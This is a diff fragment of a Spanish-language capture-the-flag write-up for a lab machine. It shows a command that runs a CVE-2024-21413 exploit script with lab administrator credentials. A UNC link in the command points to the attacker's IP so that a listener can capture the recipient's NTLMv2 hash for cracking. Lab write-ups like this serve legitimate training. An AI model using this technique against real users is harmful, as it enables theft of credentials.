@@ -106,7 +106,7 @@ despues de investigar un poco hemos encontrado el usuario administrator el cual 
 `Esta CVE nos permite enviar un correo electronico y con el responder vamos a estar a la escucha para poder obtener un hash NTLMv2 el cual podemos crackear`
 
 ```python
-python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\10.10.14.71\test\meeting" --subject "XD
+python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.140\meeting" --subject "XD
 ```
 ![[Pasted image 20240611204253.png]]
 
